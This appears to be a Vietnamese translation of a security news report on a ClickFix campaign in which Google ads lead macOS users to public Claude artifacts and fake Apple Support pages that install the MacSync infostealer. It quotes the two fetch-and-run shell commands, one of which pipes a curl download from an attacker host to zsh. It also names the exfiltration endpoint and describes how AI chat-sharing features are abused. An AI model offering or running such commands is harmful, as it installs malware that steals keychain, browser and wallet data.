# Các hiện vật Claude LLM bị lạm dụng để đẩy phần mềm đánh cắp thông tin Mac trong cuộc tấn công ClickFix

![Các hiện vật Claude LLM bị lạm dụng để đẩy phần mềm đánh cắp thông tin Mac trong cuộc tấn công ClickFix](https://www.bleepstatic.com/content/hl-images/2026/02/13/Claude_chats.jpg)

Các tác nhân đe dọa đang lạm dụng các hiện vật Claude và Quảng cáo Google trong các chiến dịch ClickFix cung cấp phần mềm độc hại đánh cắp thông tin cho người dùng macOS tìm kiếm các truy vấn cụ thể.

Ít nhất hai biến thể của hoạt động độc hại đã được quan sát thấy trong tự nhiên, và hơn 10.000 người dùng đã truy cập nội dung với hướng dẫn nguy hiểm.

Hiện vật Claude là nội dung được tạo bằng LLM của Antropic và được tác giả công khai. Nó có thể là bất cứ thứ gì từ hướng dẫn, hướng dẫn, các đoạn mã hoặc các loại đầu ra khác được tách biệt khỏi cuộc trò chuyện chính và có thể truy cập được cho bất kỳ ai thông qua các liên kết được lưu trữ trên miền [claude.ai](http://claude.ai).

[![Wiz](https://www.bleepstatic.com/c/w/MCP-Best-Practices-970x250.png)](https://www.wiz.io/lp/model-context-protocol-mcp-security-best-practices-cheat-sheet?utm%5Fsource=bleepingcomputer&utm%5Fmedium=display&utm%5Fcampaign=FY26Q3%5FINB%5FFORM%5FMCP-BestPractices-Cheat-Sheet&sfcid=701Py00000TCZuBIAX&utm%5Fterm=FY27-bleepingcomputer-article-970x250&utm%5Fcontent=MCP-Best-Practices)

Trang của một hiện vật cảnh báo người dùng rằng nội dung được hiển thị được tạo bởi người dùng và chưa được xác minh về độ chính xác.

Các nhà nghiên cứu tại bộ phận điều tra của MacPaw, Moonlock Lab, và tại công ty chặn quảng cáo AdGuard nhận thấy kết quả tìm kiếm độc hại được hiển thị cho nhiều truy vấn, như "trình phân giải DNS trực tuyến", "trình phân tích không gian đĩa CLI macOS", và "HomeBrew".

![Kết quả tìm kiếm HomeBrew độc hại](https://www.bleepstatic.com/images/news/u/1220909/2026/February/homebrew.jpg)

**Kết quả tìm kiếm HomeBrew độc hại**  
_Nguồn: AdGuard_

Kết quả độc hại được quảng bá trên Google Search dẫn đến một hiện vật Claude công khai hoặc một bài báo trên Medium giả mạo Hỗ trợ Apple. Trong cả hai trường hợp, người dùng được hướng dẫn dán một lệnh shell vào Terminal.

* Trong biến thể đầu tiên của cuộc tấn công, lệnh được đưa ra để thực thi là: `‘echo "..." | base64 -D | zsh,’`
* trong khi ở biến thể thứ hai, đó là: `‘true && cur""l -SsLfk --compressed "https://raxelpak[.]com/curl/[hash]" | zsh’`.

**Biến thể thứ hai sử dụng trang giả mạo Hỗ trợ Apple**  
_Nguồn: Moonlock Lab_

Các nhà nghiên cứu Moonlock [phát hiện](https://x.com/moonlock%5Flab/status/2021695650367226108) rằng hướng dẫn Claude độc hại đã nhận được ít nhất 15.600 lượt xem, điều này có thể là dấu hiệu của số lượng người dùng mắc lừa.

Các nhà nghiên cứu AdGuard quan sát thấy cùng một hướng dẫn vài ngày trước đó, khi nó có 12.300 lượt xem.

**Hướng dẫn ClickFix được lưu trữ trên cuộc trò chuyện Claude**  
_Nguồn: Moonlock Lab_

Chạy lệnh trong Terminal sẽ lấy một trình tải phần mềm độc hại cho [phần mềm đánh cắp thông tin MacSync](https://www.bleepingcomputer.com/news/security/new-macsync-malware-dropper-evades-macos-gatekeeper-checks/), phần mềm này đánh cắp thông tin nhạy cảm có trên hệ thống.

Theo các nhà nghiên cứu, phần mềm độc hại thiết lập liên lạc với cơ sở hạ tầng điều khiển và kiểm soát (C2) bằng cách sử dụng mã thông báo và khóa API được mã hóa cứng, và giả mạo user-agent trình duyệt macOS để hòa nhập vào hoạt động bình thường.

"Các nhà nghiên cứu cho biết: "Phản hồi được truyền trực tiếp đến osascript – AppleScript xử lý việc đánh cắp thực tế (keychain, dữ liệu trình duyệt, ví tiền điện tử)."

Dữ liệu bị đánh cắp được đóng gói vào một tệp lưu trữ tại '/tmp/osalogging.zip', và sau đó được xuất ra C2 của kẻ tấn công tại _a2abotnet\[.\]com/gate_ thông qua một yêu cầu POST HTTP. Trong trường hợp thất bại, tệp lưu trữ được chia thành các phần nhỏ hơn, và việc xuất ra được thử lại tám lần. Sau khi tải lên thành công, bước dọn dẹp sẽ xóa tất cả dấu vết.

MoonLock Lab phát hiện ra rằng cả hai biến thể đều lấy giai đoạn thứ hai từ cùng một địa chỉ C2, cho thấy cùng một tác nhân đe dọa đứng sau hoạt động được quan sát thấy.

Một [chiến dịch tương tự](https://www.bleepingcomputer.com/news/security/google-ads-for-shared-chatgpt-grok-guides-push-macos-infostealer-malware/) đã lợi dụng tính năng chia sẻ trò chuyện trong ChatGPT và Grok để cung cấp phần mềm đánh cắp thông tin AMOS. Vào tháng 12 năm 2025, các nhà nghiên cứu phát hiện ra rằng các cuộc trò chuyện ChatGPT và Grok được quảng bá sau khi các nhà nghiên cứu phát hiện ra ChatGPT và Grok đang được tận dụng trong các cuộc tấn công ClickFix nhắm vào người dùng Mac.

Biến thể Claude của cuộc tấn công cho thấy việc lạm dụng đã mở rộng sang các mô hình ngôn ngữ lớn (LLMs) khác.

Người dùng được khuyến nghị thận trọng và tránh thực thi trong Terminal các lệnh mà họ không hiểu đầy đủ. Như các nhà nghiên cứu Kaspersky đã lưu ý trong quá khứ, hỏi chatbot trong cùng một cuộc trò chuyện về sự an toàn của các lệnh được cung cấp là một cách đơn giản để xác định xem chúng có an toàn hay không.